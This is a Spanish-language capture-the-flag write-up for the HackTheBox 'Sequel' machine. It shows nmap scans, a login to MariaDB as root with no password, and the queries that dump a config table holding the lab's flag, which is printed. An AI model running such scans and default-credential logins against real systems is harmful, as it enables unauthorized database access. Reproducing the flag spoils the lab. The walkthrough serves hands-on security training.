---
title: Sequel HTB Walkthrough
published: true
---

# Sequel HTB

En este artículo trataré la resolución de una de las máquinas del Tier 1 del starting point de HackTheBox.

## Fase de reconocimiento

Una vez comprobado que la maquina está activa (`ping -c 1 <ip>`) y sabiendo en base al ttl que se trata de una máquina linux. Lanzamos nmap para buscar los puertos abiertos:

```
$nmap <ip> --open -p- -n --min-rate 5000
```

Obteniendo la siguiente salida:

```
Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-29 20:48 CET
Nmap scan report for 10.129.252.146
Host is up (0.077s latency).
Not shown: 64127 closed ports, 1407 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 22.28 seconds
```

Seguimos con nmap para detectar más información del servicio que corre en el puerto abierto:

```
nmap -p3306 -sCV <ip>
```

Obteniendo:

```
Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-29 20:59 CET

PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 113
|   Capabilities flags: 63486
|   Some Capabilities: ODBCClient, IgnoreSpaceBeforeParenthesis, FoundRows, InteractiveClient, Support41Auth, IgnoreSigpipes, LongColumnFlag, SupportsLoadDataLocal, SupportsCompression, SupportsTransactions, Speaks41ProtocolOld, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, ConnectWithDatabase, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: ~ONx48\F*>;KIjZcdK-:
|_  Auth Plugin Name: mysql_native_password

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 183.41 seconds
```

## Conectádonos a MySQL

Como hemos visto, se trata del servicio mysql, mediante el cuál podemos conectarnos a una base de datos. Para ello es necesario tener instaladas las herramientas:

```
sudo apt install mysql*
```

Podemos listar los posible parámetros con `mysql --help`. Para conectarnos a la máquina:

```
mysql -h <ip> -u root
```

Como utiliza las credenciales por defecto nos permite conectarnos directamentamente con el usuario `root`:

```
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 118
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```

## Navegando la BD.

Una vez dentro podemos listar las bases de datos:

```sql
MariaDB [(none)]> SHOW databases;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.144 sec)
```

Seleccionamos para utilizar `htb`:

```sql
MariaDB [(none)]> USE htb;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [htb]>
```

Y listamos las tablas:

```sql
MariaDB [htb]> SHOW tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.045 sec)
```

Y por último listamos el contenido de la tabla `config`:

```sql
MariaDB [htb]> SELECT * FROM config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.156 sec)
```

Y ya tendríamos la flag!